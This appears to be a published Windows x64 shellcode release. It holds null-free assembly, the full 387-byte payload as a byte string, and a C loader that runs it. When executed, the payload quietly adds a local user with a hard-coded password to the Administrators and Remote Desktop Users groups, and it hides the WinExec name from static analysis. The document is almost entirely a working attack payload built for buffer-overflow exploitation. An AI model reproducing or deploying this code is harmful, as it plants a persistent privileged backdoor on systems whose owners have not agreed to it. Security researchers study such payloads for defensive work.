# Shellcode Title:  Windows/x64 - Dynamic NoNull Add RDP Admin (BOKU:SP3C1ALM0V3) Shellcode (387 Bytes)
# Shellcode Author: Bobby Cooke (boku)
# Date: 02/05/2021
# Tested on: Windows 10 v2004 (x64)
# Compiled from: Kali Linux (x86_64)
# Full Disclosure: github.com/boku7/x64win-AddRdpAdminShellcode
# Shellcode Description:
# 64bit Windows 10 shellcode that adds user BOKU:SP3C1ALM0V3 to the system and the localgroups
# Administrators & "Remote Desktop Users". Position Independent Code (PIC) that dynamically resolves
# KERNEL32 DLL via PEB & LDR. Shellcode contains no null bytes, and therefor can be used on typical
# stack based Buffer OverFlow vulnerabilities. Shellcode must be executed from a process with either
# a HIGH or SYSTEM integrity level.

;   nasm -f win64 addRdpAdmin.asm -o addRdpAdmin.o
;   for i in $(objdump -D addRdpAdmin.o | grep "^ " | cut -f2); do echo -n "\x$i" ; done
; Get kernel32.dll base address
xor rdi, rdi            ; RDI = 0x0
mul rdi                 ; RAX&RDX =0x0
mov rbx, gs:[rax+0x60]  ; RBX = Address_of_PEB
mov rbx, [rbx+0x18]     ; RBX = Address_of_LDR
mov rbx, [rbx+0x20]     ; RBX = 1st entry in InitOrderModuleList / ntdll.dll
mov rbx, [rbx]          ; RBX = 2nd entry in InitOrderModuleList / kernelbase.dll
mov rbx, [rbx]          ; RBX = 3rd entry in InitOrderModuleList / kernel32.dll
mov rbx, [rbx+0x20]     ; RBX = &kernel32.dll ( Base Address of kernel32.dll)
mov r8, rbx             ; RBX & R8 = &kernel32.dll

; Get kernel32.dll ExportTable Address
mov ebx, [rbx+0x3C]     ; RBX = Offset NewEXEHeader
add rbx, r8             ; RBX = &kernel32.dll + Offset NewEXEHeader = &NewEXEHeader
xor rcx, rcx            ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
add cx, 0x88ff
shr rcx, 0x8            ; RCX = 0x88ff --> 0x88
mov edx, [rbx+rcx]      ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
add rdx, r8             ; RDX = &kernel32.dll + RVA ExportTable = &ExportTable

; Get &AddressTable from Kernel32.dll ExportTable
xor r10, r10
mov r10d, [rdx+0x1C]    ; RDI = RVA AddressTable
add r10, r8             ; R10 = &AddressTable

; Get &NamePointerTable from Kernel32.dll ExportTable
xor r11, r11
mov r11d, [rdx+0x20]    ; R11 = [&ExportTable + Offset RVA Name PointerTable] = RVA NamePointerTable
add r11, r8             ; R11 = &NamePointerTable (Memory Address of Kernel32.dll Export NamePointerTable)

; Get &OrdinalTable from Kernel32.dll ExportTable
xor r12, r12
mov r12d, [rdx+0x24]    ; R12 = RVA  OrdinalTable
add r12, r8             ; R12 = &OrdinalTable

jmp short apis

; Get the address of the API from the Kernel32.dll ExportTable
getapiaddr:
pop rbx                 ; save the return address for ret 2 caller after API address is found
pop rcx                 ; Get the string length counter from stack
xor rax, rax            ; Setup Counter for resolving the API Address after finding the name string
mov rdx, rsp            ; RDX = Address of API Name String to match on the Stack
push rcx                ; push the string length counter to stack
loop:
mov rcx, [rsp]          ; reset the string length counter from the stack
xor rdi,rdi             ; Clear RDI for setting up string name retrieval
mov edi, [r11+rax*4]    ; EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
add rdi, r8             ; RDI = &NameString    = RVA NameString + &kernel32.dll
mov rsi, rdx            ; RSI = Address of API Name String to match on the Stack  (reset to start of string)
repe cmpsb              ; Compare strings at RDI & RSI
je resolveaddr          ; If match then we found the API string. Now we need to find the Address of the API
incloop:
inc rax
jmp short loop

; Find the address of GetProcAddress by using the last value of the Counter
resolveaddr:
pop rcx                 ; remove string length counter from top of stack
mov ax, [r12+rax*2]     ; RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of kernel32.<API>
mov eax, [r10+rax*4]    ; RAX = RVA API = [&AddressTable + API OrdinalNumber]
add rax, r8             ; RAX = Kernel32.<API> = RVA kernel32.<API> + kernel32.dll BaseAddress
push rbx                ; place the return address from the api string call back on the top of the stack
ret                     ; return to API caller

apis:                   ; API Names to resolve addresses
; WinExec | String length : 7
xor rcx, rcx
add cl, 0x7                 ; String length for compare string
mov rax, 0x9C9A87BA9196A80F ; not 0x9C9A87BA9196A80F = 0xF0,WinExec
not rax ;mov rax, 0x636578456e6957F0 ; cexEniW,0xF0 : 636578456e6957F0 - Did Not to avoid WinExec returning from strings static analysis
shr rax, 0x8                ; cexEniW,0xF0 --> 0x00,cexEniW
push rax
push rcx                    ; push the string length counter to stack
call getapiaddr             ; Get the address of the API from Kernel32.dll ExportTable
mov r14, rax                ; R14 = Kernel32.WinExec Address

jmp short command

WinExec:
; UINT WinExec(
;   LPCSTR lpCmdLine,    => RCX = <COMMAND STRING> + 0x00 (Null Terminated)
;   UINT   uCmdShow      => RDX = 0x0 = SW_HIDE
; );
xor rdx, rdx                ; RDX = 0x0 = SW_HIDE
sub rsp, 0x20               ; WinExec clobbers first 0x20 bytes of stack (Overwrites our command string when proxied to CreatProcessA)
call r14                    ; Call WinExec(<COMMNAD>, SW_HIDE)
add rsp, 0x20               ; Fix stack
ret

command:
; WinExec("cmd.exe /c net user BOKU SP3C1ALM0V3 /add && net localgroup Administrators BOKU /add && net localgroup \"Remote Desktop Users\" BOKU /add", 0x0);
; 63 6D 64 2E 65 78 65 20 2F 63 20 6E 65 74 20 75 cmd.exe /c net u
; 73 65 72 20 42 4F 4B 55 20 53 50 33 43 31 41 4C ser BOKU SP3C1AL
; 4D 30 56 33 20 2F 61 64 64 20 26 26 20 6E 65 74 M0V3 /add && net
; 20 6C 6F 63 61 6C 67 72 6F 75 70 20 41 64 6D 69  localgroup Admi
; 6E 69 73 74 72 61 74 6F 72 73 20 42 4F 4B 55 20 nistrators BOKU
; 2F 61 64 64 20 26 26 20 6E 65 74 20 6C 6F 63 61 /add && net loca
; 6C 67 72 6F 75 70 20 22 52 65 6D 6F 74 65 20 44 lgroup "Remote D
; 65 73 6B 74 6F 70 20 55 73 65 72 73 22 20 42 4F esktop Users" BO
; 4B 55 20 2F 61 64 64 00                         KU /add.
; String length : 135
mov rax, 0x6464612f20554bFF ; dda/ UK : 6464612f20554b
shr rax, 0x8
push rax
mov rax, 0x4f42202273726573 ; OB "sres : 4f42202273726573
push rax
mov rax, 0x5520706f746b7365 ; U potkse : 5520706f746b7365
push rax
mov rax, 0x442065746f6d6552 ; D etomeR : 442065746f6d6552
push rax
mov rax, 0x222070756f72676c ; " puorgl : 222070756f72676c
push rax
mov rax, 0x61636f6c2074656e ; acol ten : 61636f6c2074656e
push rax
mov rax, 0x202626206464612f ;  && dda/ : 202626206464612f
push rax
mov rax, 0x20554b4f42207372 ;  UKOB sr : 20554b4f42207372
push rax
mov rax, 0x6f7461727473696e ; otartsin : 6f7461727473696e
push rax
mov rax, 0x696d64412070756f ; imdA puo : 696d64412070756f
push rax
mov rax, 0x72676c61636f6c20 ; rglacol  : 72676c61636f6c20
push rax
mov rax, 0x74656e2026262064 ; ten && d : 74656e2026262064
push rax
mov rax, 0x64612f203356304d ; da/ 3V0M : 64612f203356304d
push rax
mov rax, 0x4c41314333505320 ; LA1C3PS  : 4c41314333505320
push rax
mov rax, 0x554b4f4220726573 ; UKOB res : 554b4f4220726573
push rax
mov rax, 0x752074656e20632f ; u ten c/ : 752074656e20632f
push rax
mov rax, 0x206578652e646d63 ;  exe.dmc : 206578652e646d63
push rax
mov rcx, rsp                ; RCX = <COMMAND STRING>,0x0
call WinExec

###########################################################################################################################################

#include <windows.h>
// C Shellcode Run Code referenced from reenz0h (twitter: @sektor7net)
int main(void) {
	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	unsigned char payload[] =
		"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49"
		"\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44"
		"\x8b\x52\x1c\x4d\x01\xc2\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59"
		"\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff"
		"\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91"
		"\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0\xff\xff\xff\x49\x89\xc6\xeb\x0f\x48\x31\xd2\x48\x83\xec\x20"
		"\x41\xff\xd6\x48\x83\xc4\x20\xc3\x48\xb8\xff\x4b\x55\x20\x2f\x61\x64\x64\x48\xc1\xe8\x08\x50\x48\xb8\x73\x65\x72\x73\x22"
		"\x20\x42\x4f\x50\x48\xb8\x65\x73\x6b\x74\x6f\x70\x20\x55\x50\x48\xb8\x52\x65\x6d\x6f\x74\x65\x20\x44\x50\x48\xb8\x6c\x67"
		"\x72\x6f\x75\x70\x20\x22\x50\x48\xb8\x6e\x65\x74\x20\x6c\x6f\x63\x61\x50\x48\xb8\x2f\x61\x64\x64\x20\x26\x26\x20\x50\x48"
		"\xb8\x72\x73\x20\x42\x4f\x4b\x55\x20\x50\x48\xb8\x6e\x69\x73\x74\x72\x61\x74\x6f\x50\x48\xb8\x6f\x75\x70\x20\x41\x64\x6d"
		"\x69\x50\x48\xb8\x20\x6c\x6f\x63\x61\x6c\x67\x72\x50\x48\xb8\x64\x20\x26\x26\x20\x6e\x65\x74\x50\x48\xb8\x4d\x30\x56\x33"
		"\x20\x2f\x61\x64\x50\x48\xb8\x20\x53\x50\x33\x43\x31\x41\x4c\x50\x48\xb8\x73\x65\x72\x20\x42\x4f\x4b\x55\x50\x48\xb8\x2f"
		"\x63\x20\x6e\x65\x74\x20\x75\x50\x48\xb8\x63\x6d\x64\x2e\x65\x78\x65\x20\x50\x48\x89\xe1\xe8\x2a\xff\xff\xff";
	unsigned int payload_len = 387;

	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	// If all good, run the payload
	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}
	return 0;
}